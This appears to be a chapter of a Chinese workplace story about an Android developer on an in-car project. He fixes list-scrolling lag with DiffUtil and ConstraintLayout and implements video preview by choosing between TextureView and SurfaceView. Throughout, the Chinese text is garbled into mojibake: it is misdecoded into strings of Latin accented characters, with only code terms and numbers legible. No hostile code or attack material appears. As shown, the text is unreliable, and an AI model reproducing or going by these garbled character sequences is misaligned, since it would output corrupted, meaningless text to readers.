<p>ä»–å¯¹ç€å·¥å…·ç•Œé¢å–ƒå–ƒè‡ªè¯­ï¼Œæ‰‹æŒ‡ç‚¹ç€å±å¹•æ¢³ç†é€»è¾‘ï¼šâ€œå·¦ä¾§å’Œä¸Šä¾§çš„é»‘è‰²çº¿æ®µæ˜¯å¯æ‹‰ä¼¸åŒºåŸŸï¼Œåªåœ¨æŒ‡å®šèŒƒå›´æ‹‰ä¼¸ï¼Œä¸ä¼šåŠ¨å››è§’çš„åœ†è§’ï¼›å³ä¾§å’Œä¸‹ä¾§æ˜¯å†…å®¹åŒºåŸŸï¼Œæ§åˆ¶æ–‡æœ¬è¾¹ç•Œé˜²è´´è¾¹ã€‚è¿™æ ·ä¸€æ¥ï¼Œä¸ç®¡æ–‡æœ¬å¤šé•¿ï¼Œæ°”æ³¡è¾¹ç¼˜éƒ½èƒ½æ¸…æ™°ï¼Œåœ†è§’ä¹Ÿä¸ä¼šå˜å½¢ã€‚â€</p>
<p>è®¾è®¡åŒäº‹è§ä»–æ€è·¯æ¸…æ™°ï¼Œåˆèƒ½å¿«é€Ÿä¸Šæ‰‹å¤„ç†ï¼Œæ”¾å¿ƒåœ°ç‚¹ç‚¹å¤´ä¾¿ç‹¬è‡ªèµ°å¼€äº†ã€‚</p>
<p>æ—å“å¯¹ç€å·¥å…·ç»§ç»­æ“ä½œï¼Œä¸€è¾¹å°†æ™®é€š PNG å¤„ç†æˆ .9 å›¾ï¼Œä¸€è¾¹å–ƒå–ƒè¡¥å……ç€ä½¿ç”¨ç»†èŠ‚ï¼Œåƒæ˜¯åœ¨ç»™è‡ªå·±æ¢³ç†æ³¨æ„äº‹é¡¹ï¼šâ€œå¯æ‹‰ä¼¸åŒºåŸŸä¸èƒ½ç”»å…³é”®å…ƒç´ ï¼Œä¸ç„¶æ‹‰ä¼¸åè‚¯å®šé”™ä½ï¼›é€æ˜è¾¹æ¡†å¿…é¡»ä¸¥æ ¼æ§åˆ¶åœ¨ <code>1px</code>ï¼Œå¤šäº†å°‘äº†éƒ½ä¼šè§£æå¤±è´¥ã€‚â€</p>
<p>ä»–æ›¿æ¢åŸæœ‰èµ„æºé¢„è§ˆï¼Œè§æ°”æ³¡æ‹‰ä¼¸è‡ªç„¶ã€è¾¹ç¼˜é”åˆ©ï¼Œåˆæ¥ç€è‡ªè¯­ï¼šâ€œè¿˜å¾—é€‚é…ä¸åŒå¯†åº¦å±å¹•ï¼Œå¾—å‡†å¤‡å¤šå¥—å›¾æ”¾è¿›å¯¹åº” <code>drawable</code> æ–‡ä»¶å¤¹ï¼Œä¸ç„¶åœ¨é«˜æ¸…å±ä¸Šä¼šæ¨¡ç³Šã€‚â€</p>
<p>è§£å†³å®Œ .9 å›¾çš„é—®é¢˜ï¼Œæ—å“å¯¹ç€å±å¹•åå¤èµ°æŸ¥äº†å‡ éï¼Œå¯¹è¯æ°”æ³¡æ‹‰ä¼¸è‡ªç„¶ã€è¾¹ç¼˜é”åˆ©ï¼Œåœ¨ä¸åŒæ–‡æœ¬é•¿åº¦å’Œå±å¹•å°ºå¯¸ä¸‹éƒ½è¡¨ç°ç¨³å®šï¼Œç¡®è®¤æ— è¯¯åï¼Œä¾¿æŠŠéœ€æ±‚æ‰“å›ç»™ UI å›¢é˜Ÿç»§ç»­åç»­èµ°æŸ¥ã€‚</p>
<p>åˆšå…³æ‰è®¾è®¡å·¥å…·ï¼Œç”µè„‘å³ä¸‹è§’çš„é‚®ç®±å°±å¼¹å‡ºäº†æ–°æé†’ï¼Œæ ‡æ³¨ç€â€œç´§æ€¥ Bugâ€ã€‚</p>
<p>æ—å“é¡ºæ‰‹ç‚¹å¼€ï¼Œå‘ç° Bug å½’å±æ¨¡å—æ­£æ˜¯è‡ªå·±è´Ÿè´£çš„æ–°é—»æ¨¡å—ï¼Œæ ‡é¢˜èµ«ç„¶å†™ç€â€œæ–°é—»åˆ—è¡¨æ•°æ®é‡è¾ƒå¤§æ—¶æ»‘åŠ¨æ‰å¸§ï¼Œå¡é¡¿æ˜æ˜¾â€ã€‚</p>
<p>ä»–å¾€ä¸‹æ»‘åŠ¨è¯¦æƒ…é¡µï¼Œç›®å…‰è½åœ¨æäº¤è€…ä¸€æ æ—¶ï¼Œå˜´è§’ä¸è‡ªè§‰åœ°å¼¯äº†å¼¯â€”â€”æäº¤äººæ˜¯å°å®‰ã€‚æ—å“å¿ƒé‡Œæš—è‡ªçªƒå–œï¼ŒæŒ‡å°–å·²ç»æ‚¬åœ¨Qä¹¦èŠå¤©æ¡†ä¸Šï¼Œæ­£æƒ³å‘æ¶ˆæ¯é—®å¥¹æ˜¯ä¸æ˜¯ä¹Ÿæ¥æ”¯æ´è½¦è½½é¡¹ç›®äº†ã€‚</p>
<p>â€œå°æ—ï¼Œçœ‹åˆ°æ–°é—»åˆ—è¡¨çš„ Bug äº†å—ï¼Ÿâ€ä¸€é“å£°éŸ³çªç„¶ä»èº«åä¼ æ¥ï¼Œæ—å“å›å¤´ä¸€çœ‹ï¼Œå¼ ç£Šç«™åœ¨ä»–å·¥ä½æ—ï¼Œè¯­æ°”å¸¦ç€å‡ åˆ†æ€¥åˆ‡ï¼Œâ€œè¿™äº› Bug ä¼˜å…ˆçº§å¾ˆé«˜ï¼Œæµ‹è¯•é‚£è¾¹åé¦ˆè½¦æœºé«˜é€Ÿæ»‘åŠ¨æ—¶å¡é¡¿ã€æ‰å¸§ï¼Œé—®é¢˜æ¯”è¾ƒå¤šï¼Œä½ ä»”ç»†çœ‹çœ‹ï¼Œä»Šå¤©å¿…é¡»æå®šã€‚â€</p>
<p>â€œå¥½çš„å¼ å“¥ï¼Œæˆ‘é©¬ä¸Šæ’æŸ¥åŸå› ã€‚â€æ—å“ç«‹é©¬åº”å£°ç‚¹å¤´ï¼Œç”Ÿæ€•å¼ ç£Šé‡ææ—§äº‹ã€‚</p>
<p>æ”¶èµ·ç¬‘æ„ï¼Œæ”¶æ•›å¿ƒç¥ï¼Œå¿«é€Ÿæµè§ˆ Bug è¯¦æƒ…é‡Œçš„è¡¥å……è¯´æ˜ï¼šåˆ—è¡¨æ•°æ®è¶…è¿‡50æ¡åæ‰å¸§é¢‘å‘ï¼Œæ»šåŠ¨æ—¶å¸§ç‡æ³¢åŠ¨å‰§çƒˆã€‚</p>
<p>ä»–å½“å³æ‰“å¼€ <code>RecyclerView</code> çš„ç›¸å…³ä»£ç å’Œè¿è¡Œæ—¥å¿—ï¼Œçœ‰å¤´å¾®å¾®è¹™èµ·ï¼Œç€æ‰‹é€è¡Œåˆ†æé—®é¢˜æ ¹æºã€‚</p>
<p>æœä¸å…¶ç„¶ï¼Œç°æœ‰é€‚é…å™¨å­˜åœ¨ä¸¤å¤„å…³é”®é—®é¢˜ï¼šä¸€æ˜¯ä»åœ¨ä½¿ç”¨ <code>notifyDataSetChanged()</code> å…¨é‡åˆ·æ–°ï¼Œå“ªæ€•åªæœ‰å•æ¡æ–°é—»æ›´æ–°ï¼Œä¹Ÿä¼šè§¦å‘æ‰€æœ‰ <code>Item</code> é‡ç»˜ï¼Œå¯¼è‡´ <code>CPU</code> è´Ÿè½½é£™å‡ï¼›äºŒæ˜¯æœªåˆç†é…ç½®ç¼“å­˜æ± ï¼Œä¸åŒç±»å‹çš„æ–°é—»å¡ç‰‡å…±ç”¨åŒä¸€ç¼“å­˜ï¼Œå¤ç”¨æ•ˆç‡ä½ä¸‹ï¼Œé€ æˆå†…å­˜æ³¢åŠ¨ã€‚</p>
<p>æ—å“å…ˆä»åˆ·æ–°æœºåˆ¶å…¥æ‰‹ï¼Œé›†æˆ <code>DiffUtil</code> å·¥å…·ç±»ã€‚</p>
<p>ä»–åˆ›å»ºä¸å¯å˜æ•°æ®ç±» <code>NewsItem</code>ï¼Œå°è£…æ–°é—» <code>ID</code>ã€æ ‡é¢˜ã€å†…å®¹ã€ç±»å‹ç­‰å­—æ®µï¼Œç¡®ä¿æ•°æ®ä¸å¯å˜ä»¥é¿å…å¹¶å‘é—®é¢˜ã€‚</p>
<p>éšåå®ç°è‡ªå®šä¹‰ <code>DiffUtil.ItemCallback&lt;NewsItem&gt;</code>ï¼Œé‡å†™ä¸¤ä¸ªæ ¸å¿ƒæ–¹æ³•ï¼š<code>areItemsTheSame</code> é€šè¿‡æ–°é—»å”¯ä¸€<code>ID</code> åˆ¤æ–­æ˜¯å¦ä¸ºåŒä¸€æ•°æ®ï¼Œé¿å…é‡å¤åˆ·æ–°ç›¸åŒ <code>Item</code>ï¼›<code>areContentsTheSame</code> å¯¹æ¯” <code>Item</code> çš„æ ¸å¿ƒå†…å®¹å­—æ®µï¼Œç²¾å‡†å®šä½æ•°æ®å˜åŒ–çš„éƒ¨åˆ†ã€‚</p>
<p>â€œä¹‹å‰ç”¨å…¨é‡åˆ·æ–°ï¼Œ<code>RecyclerView</code> ä¸çŸ¥é“å“ªäº› <code>Item</code> å˜äº†ï¼Œåªèƒ½å…¨ç›˜é‡ç»˜ã€‚â€æ—å“ä¸€è¾¹å°†é€‚é…å™¨ç»§æ‰¿è‡ª <code>ListAdapter</code>ï¼Œä¸€è¾¹è‡ªè¯­ï¼Œâ€œç°åœ¨ç”¨ <code>submitList()</code> æäº¤æ–°æ•°æ®ï¼Œ<code>DiffUtil</code> ä¼šè‡ªåŠ¨è®¡ç®—æ–°æ—§åˆ—è¡¨çš„å·®å¼‚ï¼Œåªåˆ·æ–°å˜åŒ–çš„ <code>Item</code>ï¼Œæ€§èƒ½è‡³å°‘èƒ½æå‡ 40%ã€‚â€</p>
<p>æ¥ç€ä»–ä¼˜åŒ–ç¼“å­˜ç­–ç•¥ï¼Œé’ˆå¯¹å›¾æ–‡ã€çº¯æ–‡å­—ä¸¤ç§æ–°é—»å¡ç‰‡ï¼Œé…ç½® <code>RecycledViewPool</code> çš„ç¼“å­˜æ•°é‡ï¼šâ€œå›¾æ–‡å¡ç‰‡å¸ƒå±€å¤æ‚ï¼Œåˆ›å»ºæˆæœ¬é«˜ï¼Œç¼“å­˜æ•°é‡è®¾ä¸º 5ï¼›çº¯æ–‡å­—å¡ç‰‡ç®€å•ï¼Œè®¾ä¸º 8ï¼Œè¿™æ ·æ—¢èƒ½ä¿è¯å¤ç”¨æ•ˆç‡ï¼Œåˆä¸ä¼šå› ç¼“å­˜è¿‡å¤šå ç”¨å†…å­˜ã€‚â€</p>
<p>åŒæ—¶ï¼Œä»–åœ¨ <code>RecyclerView</code> ä¸å†ä½¿ç”¨ä¹‹åï¼Œæ¸…ç†å›¾ç‰‡åŠ è½½ä»»åŠ¡å’Œä¸´æ—¶æ•°æ®ï¼Œé¿å…å†…å­˜æ³„æ¼å’Œæ³¢åŠ¨ã€‚</p>
<p>ä¼˜åŒ–å®Œåˆ·æ–°å’Œç¼“å­˜ï¼Œæ—å“å°†ç›®å…‰æŠ•å‘å¸ƒå±€ç»“æ„ã€‚ä»–æ‰“å¼€æ–°é—»å¡ç‰‡çš„ <code>XML</code> å¸ƒå±€æ–‡ä»¶ï¼Œå‘ç°åŸæœ‰å¸ƒå±€ç”¨äº†ä¸‰å±‚ <code>LinearLayout</code> åµŒå¥—ï¼šå¤–å±‚åŒ…è£¹å¡ç‰‡æ•´ä½“ï¼Œä¸­å±‚åˆ†éš”å›¾ç‰‡å’Œæ–‡æœ¬åŒºåŸŸï¼Œå†…å±‚æ’åˆ—æ ‡é¢˜å’Œå†…å®¹ã€‚</p>
<p>åµŒå¥—å±‚çº§å¤ªå¤šäº†ï¼Œè¿™ä¹Ÿæ˜¯å¡é¡¿çš„é‡è¦åŸå› ã€‚â€</p>
<p>è½¦æœºç«¯çš„ <code>ViewGroup</code> æµ‹é‡å’Œå¸ƒå±€æ˜¯è‡ªä¸Šè€Œä¸‹é€’å½’è¿›è¡Œçš„ï¼Œæ¯å¤šä¸€å±‚åµŒå¥—ï¼Œå°±ä¼šå¢åŠ ä¸€æ¬¡æµ‹é‡å’Œå¸ƒå±€è¿ç®—ï¼Œå°¤å…¶åœ¨ <code>RecyclerView</code> å¿«é€Ÿæ»‘åŠ¨æ—¶ï¼Œå¤šå±‚åµŒå¥—ä¼šå¤§å¹…å¢åŠ  <code>CPU</code> è´Ÿæ‹…ã€‚</p>
<p>æ—å“æœæ–­å°†å¸ƒå±€æ›¿æ¢ä¸º <code>ConstraintLayout</code>ï¼Œé€šè¿‡çº¦æŸæœºåˆ¶å®ç°æ‰å¹³åŒ–å¸ƒå±€ï¼Œå°†ä¸‰å±‚åµŒå¥—å‹ç¼©ä¸ºä¸€å±‚ã€‚</p>
<p>ä»–é‡æ–°æ¢³ç†å¸ƒå±€é€»è¾‘ï¼šå°†å¡ç‰‡æ ¹å¸ƒå±€è®¾ä¸º <code>ConstraintLayout</code>ï¼Œå›¾æ–‡å¡ç‰‡çš„å›¾ç‰‡é”šå®šåœ¨å·¦ä¾§ï¼Œé€šè¿‡ <code>app:layout_constraintStart_toStartOf="parent"</code> å’Œ <code>app:layout_constraintTop_toTopOf="parent"</code> å›ºå®šä½ç½®ï¼Œå®½åº¦è®¾ä¸º <code>80dp</code>ï¼Œé«˜åº¦è®¾ä¸º <code>0dp</code> å¹¶è®¾ç½® <code>app:layout_constraintDimensionRatio="1:1"</code>ï¼Œä¿è¯å›¾ç‰‡æ¯”ä¾‹å›ºå®šã€‚æ ‡é¢˜æ–‡æœ¬åˆ™é€šè¿‡ <code>app:layout_constraintStart_toEndOf="@id/iv_news_img"</code> é”šå®šåœ¨å›¾ç‰‡å³ä¾§ï¼Œå†…å®¹æ–‡æœ¬å¯¹é½æ ‡é¢˜ä¸‹æ–¹ï¼Œç”¨ <code>app:layout_constraintBottom_toBottomOf="parent"</code> ç¡®ä¿åº•éƒ¨å¯¹é½ã€‚</p>
<p>â€œ<code>ConstraintLayout</code> çš„æ ¸å¿ƒä¼˜åŠ¿å°±æ˜¯æ‰å¹³åŒ–å’Œçµæ´»çº¦æŸï¼Œä¸ä»…èƒ½å‡å°‘å±‚çº§ï¼Œè¿˜èƒ½é€šè¿‡ <code>Guideline</code> å’Œ <code>Barrier</code> å®ç°è‡ªé€‚åº”ã€‚â€æ—å“æ·»åŠ äº†å‚ç›´ <code>Guideline</code>ï¼Œå°†å¡ç‰‡å³ä¾§å†…è¾¹è·è®¾ä¸ºå±å¹•å®½åº¦çš„ 8%ï¼Œç¡®ä¿åœ¨ä¸åŒå°ºå¯¸çš„è½¦æœºå±å¹•ä¸Šï¼Œå¡ç‰‡å¸ƒå±€æ¯”ä¾‹ä¸€è‡´ï¼›åŒæ—¶ç”¨ <code>Barrier</code> å°†æ–‡æœ¬åŒºåŸŸä¸å›¾ç‰‡å…³è”ï¼Œå½“å›¾ç‰‡é«˜åº¦å˜åŒ–æ—¶ï¼Œæ–‡æœ¬åŒºåŸŸè‡ªåŠ¨è°ƒæ•´ï¼Œé¿å…é‡å ã€‚</p>
<p>å¸ƒå±€ä¼˜åŒ–å®Œæˆåï¼Œæ—å“ç«‹åˆ»è¿æ¥è½¦æœºè¿›è¡ŒçœŸæœºè‡ªæµ‹ã€‚æ‰‹æŒ‡å¿«é€Ÿæ»‘åŠ¨æ–°é—»åˆ—è¡¨ï¼Œå³ä½¿æ•°æ®é‡è¶…è¿‡80æ¡ï¼Œå¸§ç‡ä»ç¨³å®šåœ¨ 60FPS å·¦å³ï¼Œæ— ä»»ä½•æ‰å¸§å¡é¡¿ï¼Œç¼“å­˜å¤ç”¨ä¹Ÿååˆ†é¡ºç•…ï¼Œä¹‹å‰çš„ Bug å·²å½»åº•è§£å†³ã€‚</p>
<p>ä»–æˆªå›¾ç•™å­˜æµ‹è¯•æ•ˆæœï¼Œæ‰“å¼€ Bug ç®¡ç†å¹³å°ï¼Œå°†è¯¥ Bug çŠ¶æ€æ›´æ–°ä¸ºâ€œå·²ä¿®å¤â€ï¼ŒåŒæ—¶@å°å®‰å¹¶é™„ä¸Šå¤‡æ³¨ï¼šâ€œåˆ—è¡¨å¡é¡¿é—®é¢˜å·²è§£å†³ï¼Œä¼˜åŒ–äº† <code>RecyclerView</code> åˆ·æ–°æœºåˆ¶ã€ç¼“å­˜ç­–ç•¥åŠå¸ƒå±€å±‚çº§ï¼Œè‡ªæµ‹é€šè¿‡ï¼Œéº»çƒ¦ä½ å›å½’éªŒè¯ä¸‹ã€‚â€</p>
<p>å‘é€å®Œæ¯•åï¼Œæ—å“åˆç‚¹å¼€èŠå¤©æ¡†ï¼ŒæŒ‡å°–æ‚¬åœ¨è¾“å…¥æ ä¸Šï¼Œå¿ƒé‡Œçš„ç–‘æƒ‘å†æ¬¡å†’äº†å‡ºæ¥â€”â€”ä»–æ­£æƒ³æ•²å­—é—®ä¸€å¥â€œä½ æ˜¯ä¸æ˜¯æ¥æ”¯æ´è½¦è½½é¡¹ç›®äº†â€ï¼ŒåŠå…¬æ¡Œä¸Šçš„ç”µè¯çªç„¶å“äº†ã€‚</p>
<p>æ¥èµ·ç”µè¯ï¼Œäº§å“ç»ç†çš„å£°éŸ³ä¼ æ¥ï¼Œè¯­æ°”å¸¦ç€å‡ åˆ†æ€¥åˆ‡ï¼šâ€œæ—å“ï¼Œæ–°é—»æ¨¡å—è¦åŠ ä¸ªç´§æ€¥éœ€æ±‚ï¼Œå¾—åœ¨åˆ—è¡¨é‡ŒåŠ è§†é¢‘é¢„è§ˆåŠŸèƒ½ï¼Œæ”¯æŒçŸ­è§†é¢‘ç¼©ç•¥å›¾è‡ªåŠ¨æ’­æ”¾ï¼Œè¿˜å¾—èƒ½è·Ÿéšè½¦æœºå±å¹•æ—‹è½¬è‡ªé€‚åº”ï¼Œå®¢æˆ·é‚£è¾¹å‚¬å¾—ç´§ï¼Œä½ è¿™è¾¹å°½å¿«è¯„ä¼°è½åœ°ã€‚â€</p>
<p>æ—å“é—»è¨€ä¸€æ„£ï¼Œéšå³æƒ³èµ·è‡ªå·±åˆšæ‰ä¸€å¿ƒæ‰‘åœ¨ Bug ä¿®æ”¹ä¸Šï¼Œå‹æ ¹æ²¡æ¥å¾—åŠçœ‹å·¥ä½œç¾¤æ¶ˆæ¯ã€‚ä»–å¿«é€Ÿç‚¹å¼€èŠå¤©è®°å½•ï¼Œæœç„¶çœ‹åˆ°äº§å“ç»ç†ä¸€å°æ—¶å‰å°±å‘äº†éœ€æ±‚æ–‡æ¡£ï¼Œè¿˜@äº†ä»–ï¼Œåªæ˜¯å½“æ—¶è¢« <code>RecyclerView</code> çš„ä¼˜åŒ–é€»è¾‘ç¼ ä½ï¼Œå®Œå…¨æ²¡ç•™æ„ã€‚</p>
<p>â€œæŠ±æ­‰ï¼Œæˆ‘åˆšæ‰åœ¨ç´§æ€¥å¤„ç†åˆ—è¡¨å¡é¡¿çš„ Bugï¼Œæ²¡åŠæ—¶çœ‹æ¶ˆæ¯ã€‚â€æ—å“è¿å¿™è‡´æ­‰ï¼Œè¯­æ°”å¸¦ç€å‡ åˆ†æ­‰æ„ï¼Œâ€œéœ€æ±‚æˆ‘ç°åœ¨å°±çœ‹ï¼ŒæŠ€æœ¯æ–¹æ¡ˆå°½å¿«ç»™ä½ åé¦ˆï¼Œäº‰å–ä»Šå¤©å…ˆæŠŠæ ¸å¿ƒåŠŸèƒ½è½åœ°ã€‚â€</p>
<p>æ—å“å‹ä¸‹å¯¹å°å®‰çš„ç–‘æƒ‘ï¼ŒæŒ‚äº†ç”µè¯ï¼Œæ”¶èµ·èŠå¤©æ¡†ï¼Œé‡æ–°èšç„¦åˆ°ä»£ç ä¸Šï¼Œç€æ‰‹åˆ†æè§†é¢‘é¢„è§ˆåŠŸèƒ½çš„æŠ€æœ¯é€‰å‹ã€‚</p>
<p>æ—å“æœ€åˆé€‰æ‹©ç”¨ <code>SurfaceView</code> å®ç°è§†é¢‘é¢„è§ˆï¼Œè¿™æ˜¯å®‰å“æ—©æœŸå¸¸ç”¨çš„è§†é¢‘æ¸²æŸ“ç»„ä»¶ã€‚</p>
<p>ä»–å¿«é€Ÿé›†æˆæ’­æ”¾å™¨ï¼Œå®ç°äº†è§†é¢‘æ’­æ”¾åŠŸèƒ½ï¼Œä½†æµ‹è¯•æ—¶å‘ç°äº†æ˜æ˜¾é—®é¢˜ï¼šå½“è½¦æœºå±å¹•æ—‹è½¬æ—¶ï¼Œè§†é¢‘é¢„è§ˆç”»é¢ç¼©æ”¾å’Œæ–¹å‘éƒ½æœ‰é—®é¢˜ï¼Œæ— æ³•æµç•…çš„é€‚é…æ–°å¤§å°å’Œæ–¹å‘ï¼Œç”¨æˆ·ä½“éªŒæå·®ã€‚</p>
<p>â€œè¿™å°±æ˜¯ <code>SurfaceView</code> çš„å±€é™æ€§ã€‚â€æ—å“ç¿»å¼€è€æ¨çš„åœ¨çº¿ç¬”è®°ï¼Œå¯¹ç…§ç€çŸ¥è¯†ç‚¹æ¢³ç†ï¼Œâ€œ<code>SurfaceView</code> æœ‰ç‹¬ç«‹çš„ç»˜å›¾è¡¨é¢ï¼Œä¸ä¸ UI å±‚çº§å…±äº«ï¼Œè™½ç„¶æ¸²æŸ“æ€§èƒ½å¥½ã€ä¸é˜»å¡ä¸»çº¿ç¨‹ï¼Œä½†æ—‹è½¬ã€ç¼©æ”¾ç­‰ UI å˜æ¢æ”¯æŒå·®ï¼Œé—®é¢˜å¤šï¼Œè€Œä¸”å®ƒçš„æ˜¾ç¤ºä¸å— <code>View</code> æ ‘æ§åˆ¶ï¼Œå®¹æ˜“å‡ºç°å±‚çº§é”™ä¹±ã€‚â€</p>
<p>ä»–å†³å®šæ›¿æ¢ä¸º <code>TextureView</code>ï¼Œä¸¤è€…è™½éƒ½ç”¨äºé«˜æ€§èƒ½æ¸²æŸ“ï¼Œä½†ç‰¹æ€§å·®å¼‚æ˜¾è‘—ã€‚</p>
<p><code>TextureView</code> å°†è§†é¢‘å¸§æ¸²æŸ“ä¸ºçº¹ç†ï¼Œæ— ç¼é›†æˆåˆ° <code>View</code> æ ‘ä¸­ï¼Œæ”¯æŒæ‰€æœ‰ UI å˜æ¢ï¼Œè¿˜èƒ½ä¸å…¶ä»– <code>View</code> ç»„ä»¶å åŠ æ˜¾ç¤ºï¼›ä½†ç¼ºç‚¹æ˜¯æ¸²æŸ“æ•ˆç‡ç•¥ä½äº <code>SurfaceView</code>ã€‚</p>
<p>ä¸è¿‡çœ¼ä¸‹çš„æƒ…å†µï¼Œæ­£é€‚åˆã€‚</p>
<p>æ—å“åŠ¨æ‰‹ä¿®æ”¹ä»£ç ï¼Œå°†å¸ƒå±€ä¸­çš„ <code>SurfaceView</code> æ›¿æ¢ä¸º <code>TextureView</code>ï¼Œå¹¶å®ç° <code>SurfaceTextureListener</code> æ¥å£ï¼šåœ¨ <code>onSurfaceTextureAvailable</code> ä¸­åˆå§‹åŒ–æ’­æ”¾å™¨ï¼Œç»‘å®š <code>SurfaceTexture</code>ï¼›<code>onSurfaceTextureSizeChanged</code> ä¸­è°ƒæ•´æ’­æ”¾å™¨å°ºå¯¸ï¼Œé€‚é…å±å¹•æ—‹è½¬ï¼›<code>onSurfaceTextureDestroyed</code> ä¸­é‡Šæ”¾æ’­æ”¾å™¨èµ„æºå’Œ <code>SurfaceTexture</code>ï¼Œé¿å…å†…å­˜æ³„æ¼ã€‚</p>
<p>ä¸ºäº†å¹³è¡¡æ€§èƒ½ï¼Œä»–è¿˜åšäº†è¡¥å……ä¼˜åŒ–ï¼šå¼€å¯ç¡¬ä»¶åŠ é€Ÿï¼ˆè½¦æœºç«¯é»˜è®¤å¼€å¯ï¼‰ï¼Œé¿å… <code>TextureView</code> æ¸²æŸ“å¡é¡¿ï¼›åœ¨å±å¹•æ—‹è½¬æ—¶ï¼Œé€šè¿‡ <code>onConfigurationChanged</code> æ–¹æ³•æ‰‹åŠ¨è°ƒæ•´ <code>TextureView</code> çš„æ—‹è½¬è§’åº¦ï¼Œæ— éœ€é‡å¯æ’­æ”¾å™¨ã€‚ä¿®æ”¹åæµ‹è¯•ï¼Œè§†é¢‘é¢„è§ˆä¸ä»…æ’­æ”¾æµç•…ï¼Œè¿˜èƒ½è·Ÿéšå±å¹•æ—‹è½¬æ— ç¼é€‚é…ï¼Œä¸å…¶ä»– UI ç»„ä»¶å±‚çº§æ¸…æ™°ï¼Œå®Œå…¨æ»¡è¶³éœ€æ±‚ã€‚</p>
<p>ä¸è¿‡æ—å“å¹¶æœªå°±æ­¤æ­¢æ­¥ï¼Œä»–è€ƒè™‘åˆ°ç”¨æˆ·ç‚¹å‡»é¢„è§ˆå›¾è¿›å…¥å…¨å±æ’­æ”¾çš„åœºæ™¯ï¼Œç‰¹æ„åšäº†åˆ†å±‚è®¾è®¡â€”â€”å…¨å±æ’­æ”¾æ—¶ï¼Œå°†æ¸²æŸ“ç»„ä»¶åˆ‡æ¢å› <code>SurfaceView</code>ã€‚</p>
<p>è¿™æ­£æ˜¯ <code>SurfaceView</code> çš„ç”¨æ­¦ä¹‹åœ°ï¼šå…¨å±åœºæ™¯ä¸‹æ— éœ€ä¸å…¶ä»– UI ç»„ä»¶å åŠ ï¼Œä¹Ÿä¸éœ€è¦å¤æ‚çš„æ—‹è½¬ç¼©æ”¾å˜æ¢ï¼Œæ ¸å¿ƒéœ€æ±‚æ˜¯æè‡´çš„æ’­æ”¾æµç•…åº¦å’Œä½å»¶è¿Ÿï¼Œè€Œ <code>SurfaceView</code> ç‹¬ç«‹ç»˜å›¾è¡¨é¢çš„ç‰¹æ€§ï¼Œèƒ½æœ€å¤§ç¨‹åº¦é™ä½ä¸»çº¿ç¨‹é˜»å¡ï¼Œå³ä¾¿åœ¨è½¦æœºç¡¬ä»¶èµ„æºç´§å¼ æ—¶ï¼Œä¹Ÿèƒ½ä¿è¯è§†é¢‘å¸§æ¸²æŸ“ç¨³å®šï¼Œé¿å…å‡ºç°å¡é¡¿ã€èŠ±å±ã€‚</p>
<p>ä»–é€šè¿‡ç›‘å¬å…¨å±çŠ¶æ€åˆ‡æ¢é€»è¾‘ï¼Œåœ¨ç”¨æˆ·ç‚¹å‡»é¢„è§ˆè¿›å…¥å…¨å±æ—¶ï¼Œé”€æ¯ <code>TextureView</code> å¹¶åˆå§‹åŒ– <code>SurfaceView</code>ï¼Œç»‘å®šæ’­æ”¾å™¨èµ„æºï¼›é€€å‡ºå…¨å±æ—¶åˆ™åå‘åˆ‡æ¢ï¼Œé‡Šæ”¾ <code>SurfaceView</code> èµ„æºå¹¶é‡å»º <code>TextureView</code>ã€‚</p>
<p>åŒæ—¶è¡¥å……äº†èµ„æºè¡”æ¥å¤„ç†ï¼Œç¡®ä¿åˆ‡æ¢è¿‡ç¨‹ä¸­è§†é¢‘ä¸ä¸­æ–­ã€å£°éŸ³ä¸å¡é¡¿ï¼Œå®ç°é¢„è§ˆä¸å…¨å±æ’­æ”¾çš„æ— ç¼è¿‡æ¸¡ã€‚â€œå„å–æ‰€é•¿æ‰æ˜¯æœ€ä¼˜è§£ï¼Œâ€æ—å“å–ƒå–ƒè‡ªè¯­ï¼Œæ—¢ç”¨ <code>TextureView</code> è§£å†³äº†åˆ—è¡¨é¢„è§ˆçš„ UI é€‚é…é—®é¢˜ï¼Œåˆé  <code>SurfaceView</code> ä¿éšœäº†å…¨å±æ’­æ”¾çš„æ€§èƒ½åº•çº¿ã€‚</p>
<p>ç†æ¸…ç»„ä»¶åˆ‡æ¢é€»è¾‘ã€è¡¥å…¨èµ„æºé‡Šæ”¾ä»£ç ï¼Œæ—å“åˆå¯¹ç€è½¦æœºåå¤æµ‹è¯•äº†å¤šè½®é¢„è§ˆä¸å…¨å±åˆ‡æ¢åœºæ™¯ï¼Œç¡®ä¿è§†é¢‘æ’­æ”¾æµç•…ã€æ— å¡é¡¿ä¸­æ–­ï¼Œæ‰ç»ˆäºæ¾äº†å£æ°”ã€‚ä»æ¥åˆ°éœ€æ±‚åˆ°å®Œæˆæ ¸å¿ƒåŠŸèƒ½è½åœ°ï¼Œæ•´æ•´ä¸‰ä¸ªå°æ—¶ï¼Œä»–è¿æ°´éƒ½æ²¡é¡¾ä¸Šå–ä¸€å£ã€‚</p>
<p>ç¡®è®¤è§†é¢‘æ’­æ”¾åŠŸèƒ½å®Œå…¨ç¬¦åˆéœ€æ±‚ï¼Œæ—å“æˆªå›¾ç•™å­˜å„åœºæ™¯æ•ˆæœï¼Œæ•´ç†å¥½åŠŸèƒ½è¯´æ˜æ–‡æ¡£ï¼Œä¸€å¹¶æäº¤ç»™ UI å›¢é˜Ÿè¿›è¡Œèµ°æŸ¥ã€‚åˆšå‘é€å®Œæ¯•ï¼Œç”µè„‘å³ä¸‹è§’çš„ Bug ç®¡ç†å¹³å°å°±å¼¹å‡ºäº†æ–°æé†’ï¼Œçº¢è‰²çš„â€œç´§æ€¥â€æ ‡è¯†æ ¼å¤–é†’ç›®ã€‚</p>
<p>æ—å“é¡ºæ‰‹ç‚¹å¼€ï¼Œå‘ç°åˆæ˜¯æ–°é—»æ¨¡å—çš„ Bugï¼Œæäº¤äººä¸€æ èµ«ç„¶æ˜¾ç¤ºç€â€œå°å®‰â€ã€‚</p>
<p>ä»–å¿ƒå¤´ä¸€æš–ï¼Œç¬‘ç€æ‘‡äº†æ‘‡å¤´â€”â€”æœç„¶æ˜¯å°å®‰ï¼Œä½œä¸ºæµ‹è¯•å²—çš„å¥¹å‘æ¥ç»†è‡´ï¼Œæ€»èƒ½ç²¾å‡†æ•æ‰åˆ°å®¹æ˜“è¢«å¿½ç•¥çš„ç»†èŠ‚ã€‚è¿™æ¬¡çš„ Bug æè¿°å¾ˆæ¸…æ™°ï¼šå½“ç”¨æˆ·å°†ç³»ç»Ÿå­—ä½“ç¼©æ”¾å€ç‡è°ƒæ•´åˆ° 150% æ—¶ï¼Œæ²¡æœ‰ä»»ä½•æ•ˆæœã€‚</p>
